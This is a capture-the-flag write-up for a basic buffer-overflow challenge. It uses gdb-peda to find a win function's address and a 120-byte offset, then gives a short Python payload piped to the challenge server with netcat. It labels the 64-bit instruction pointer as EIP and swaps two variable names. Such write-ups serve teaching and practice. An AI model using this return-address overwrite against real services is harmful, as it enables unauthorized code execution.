### Basic Return Oriented Programming Buffer Overflow

This challenge was a very basic pwn challenge in which what we had to do was find the offset at which the Buffer Overflow occured and then re write the EIP with the Address of the win function. The address of the win function can be found like so : 
```bash
./gdb ./ret2basic
gdb-peda$ info functions
All defined functions:
Non-debugging symbols:
<REDACTED>
0x00000000004011e6  setup
0x0000000000401215  win
0x000000000040130f  vuln
<REDACTED>

```

And to find the buffer overflow we can use GDB as well :
```
gdb-peda$ pattern_create 200 
gdb-peda$ r 
Can you overflow this?: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
# After this do pattern_search and we will get the offset at 120
```
After getting the Offset we can easily write a script to exploit it 
```python
padding  = "\x15\x12\x40\x00\x00\x00\x00\x00"
payload = "a" * 120

print(payload + padding)
```
and then 
```
python exploit.py > input.txt
nc ip port < input.txt
```